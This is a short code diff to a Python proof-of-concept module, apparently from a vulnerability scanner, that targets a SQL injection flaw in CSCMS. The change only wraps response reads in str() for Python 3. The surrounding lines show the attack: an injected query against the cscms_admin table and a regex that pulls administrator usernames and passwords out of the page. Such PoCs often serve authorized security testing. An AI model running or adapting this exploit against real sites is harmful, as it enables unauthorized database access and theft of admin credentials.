@@ -59,7 +59,7 @@ class Poc(ABPoc):
             verify_url = '{target}'.format(target=self.target)+payload
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if '904c23abadd5a4648a973c86385f3930' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -81,7 +81,7 @@ class Poc(ABPoc):
                        "34,35,36,37,38,39,40,41,42%20from%20cscms_admin%23")
             request = urllib.request.Request(vul_url + payload)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             pattern = re.compile(
                 r'.*?<a[^>]*?>(?P<username>[^<>]*?):(?P<password>[^<>]*?)</a>', re.I | re.S)
             match = pattern.match(content)
